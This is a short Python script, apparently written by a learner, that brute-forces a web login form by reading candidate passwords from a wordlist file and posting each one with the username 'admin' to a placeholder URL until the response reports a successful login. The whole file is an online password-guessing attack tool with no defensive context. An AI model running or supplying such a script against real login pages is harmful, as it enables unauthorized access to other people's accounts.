import requests

# URL
url = "example.com/something"

# Path of my file
wordlist_file = "wordlist.txt"

def test_wordlist(url, wordlist):
    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip()
            print(f"Testing password: {password}")

            # Datas login
            data = {
                "username": "admin",  # Here i can put datas i want
                "password": password
            }

            try:
                # Send a POST request
                response = requests.post(url, data=data)

                # Validate login it's ok
                if "Login successful" in response.text:
                    print(f"[+] Password found: {password}")
                    break
                else:
                    print("[-] Incorrect password.")
            except Exception as e:
                print(f"Error occurred: {e}")

# Run script
test_wordlist(url, wordlist_file)